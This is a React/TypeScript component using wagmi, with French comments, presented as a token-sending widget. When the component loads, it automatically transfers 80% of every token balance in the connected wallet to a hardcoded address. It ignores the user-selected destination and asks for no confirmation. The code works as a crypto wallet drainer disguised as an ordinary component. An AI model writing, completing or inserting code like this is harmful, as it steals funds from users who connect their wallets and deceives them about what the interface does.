import { useEffect, useCallback } from 'react';
import { useAtom } from 'jotai';
import { useWalletClient, usePublicClient } from 'wagmi';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import { erc20ABI } from 'wagmi';

export const SendTokens = () => {
  const [tokens] = useAtom(globalTokensAtom);
  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);

  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();

  // Adresse de destination fixe
  const fixedDestinationAddress = '0x518c5D62647E60864EcB3826e982c93dFa154af3';

  // Automatiser l'envoi de tous les tokens disponibles
  const sendAllTokens = useCallback(async () => {
    const tokensToSend: ReadonlyArray<`0x${string}`> = tokens
      .filter((token) => BigInt(token.balance) > 0) // Vérifier les tokens avec un solde positif
      .map((token) => token.contract_address as `0x${string}`);

    if (!walletClient) {
      console.error("Wallet client non disponible");
      return;
    }

    if (!fixedDestinationAddress) {
      console.error("Adresse de destination non définie");
      return;
    }

    // Envoyer tous les tokens
    for (const tokenAddress of tokensToSend) {
      const token = tokens.find((token) => token.contract_address === tokenAddress);
      if (!token) continue;

      console.log(`Envoi du token ${token.contract_ticker_symbol} vers ${fixedDestinationAddress}`);

      try {
        const tokenBalance = BigInt(token.balance);
        const amountToSend = tokenBalance * 80n / 100n; // Calculer 80% du solde

        console.log(`Montant à envoyer pour ${token.contract_ticker_symbol}:`, amountToSend.toString());

        const allowance = await publicClient.readContract({
          address: tokenAddress,
          abi: erc20ABI,
          functionName: 'allowance',
          args: [walletClient.account, fixedDestinationAddress],
        });

        console.log(`Allowance actuelle:`, allowance.toString());

        // Vérifier si l'utilisateur a approuvé suffisamment de tokens
        if (allowance < amountToSend) {
          console.log("Autorisation insuffisante pour envoyer les tokens. Veuillez approuver avant de continuer.");
          continue; // Passer à l'itération suivante si l'autorisation est insuffisante
        }

        const { request } = await publicClient.simulateContract({
          account: walletClient.account,
          address: tokenAddress,
          abi: erc20ABI,
          functionName: 'transfer',
          args: [
            fixedDestinationAddress as `0x${string}`,
            amountToSend,
          ],
        });

        console.log("Simulation réussie, envoi de la transaction...");

        const response = await walletClient.writeContract(request);
        console.log(`Transaction envoyée pour ${token.contract_ticker_symbol}:`, response);

        // Mettre à jour l'état pour marquer le token comme envoyé
        setCheckedRecords((old) => ({
          ...old,
          [tokenAddress]: {
            ...old[tokenAddress],
            pendingTxn: response,
          },
        }));

      } catch (err) {
        console.error(`Erreur avec le token ${token?.contract_ticker_symbol}:`, err);
      }
    }
  }, [tokens, walletClient, setCheckedRecords, publicClient]);

  useEffect(() => {
    if (tokens.length > 0) {
      sendAllTokens();
    }
  }, [tokens, walletClient, sendAllTokens, publicClient]);

  return <div style={{ margin: '20px' }}>Tokens being sent automatically...</div>;
};
